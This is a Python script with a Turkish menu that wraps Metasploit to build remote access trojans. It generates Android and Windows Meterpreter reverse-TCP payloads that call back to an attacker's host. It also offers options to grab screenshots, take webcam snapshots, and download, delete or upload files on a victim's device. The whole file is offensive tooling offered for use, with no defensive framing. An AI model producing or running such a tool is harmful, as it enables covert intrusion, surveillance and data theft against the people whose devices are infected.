import os
import subprocess

def create_rat(target_os):
    if target_os == "android":
        subprocess.run(["msfvenom", "-p", "android/meterpreter/reverse_tcp", "LHOST=your_ip", "LPORT=your_port", "-o", "android_rat.apk"])
    elif target_os == "windows":
        subprocess.run(["msfvenom", "-p", "windows/meterpreter/reverse_tcp", "LHOST=your_ip", "LPORT=your_port", "-o", "windows_rat.exe"])

def start_msfconsole():
    subprocess.run(["msfconsole"])

def check_rat_installed(rat_file):
    if os.path.exists(rat_file):
        print("RAT yüklü")
    else:
        print("RAT yüklü değil")

def screenshot():
    subprocess.run(["msfconsole", "-q", "-x", "screenshot"])

def camera_access():
    subprocess.run(["msfconsole", "-q", "-x", "webcam_snap"])

def download_file(file_path):
    subprocess.run(["msfconsole", "-q", "-x", f"download {file_path}"])

def delete_file(file_path):
    subprocess.run(["msfconsole", "-q", "-x", f"rm {file_path}"])

def upload_file(local_path, remote_path):
    subprocess.run(["msfconsole", "-q", "-x", f"upload {local_path} {remote_path}"])

def main_menu():
    while True:
        print("1. Android RAT oluştur")
        print("2. Windows RAT oluştur")
        print("3. RAT kontrol paneli aç")
        print("4. RAT yüklü mü kontrol et")
        print("5. Ekran görüntüsü al")
        print("6. Kamera erişimi")
        print("7. Dosya indir")
        print("8. Dosya sil")
        print("9. Dosya yükle")
        print("0. Çıkış")
        
        choice = input("Seçiminiz: ")
        
        if choice == "1":
            create_rat("android")
        elif choice == "2":
            create_rat("windows")
        elif choice == "3":
            start_msfconsole()
        elif choice == "4":
            rat_file = input("RAT dosyasının adını girin: ")
            check_rat_installed(rat_file)
        elif choice == "5":
            screenshot()
        elif choice == "6":
            camera_access()
        elif choice == "7":
            file_path = input("Dosya yolunu girin: ")
            download_file(file_path)
        elif choice == "8":
            file_path = input("Silinmesini istediğiniz dosyanın yolunu girin: ")
            delete_file(file_path)
        elif choice == "9":
            local_path = input("Yüklemek istediğiniz dosyanın yerel yolunu girin: ")
            remote_path = input("Yüklemek istediğiniz dosyanın uzak yolunu girin: ")
            upload_file(local_path, remote_path)
        elif choice == "0":
            break
        else:
            print("Geçersiz seçim")

if __name__ == "__main__":
    main_menu()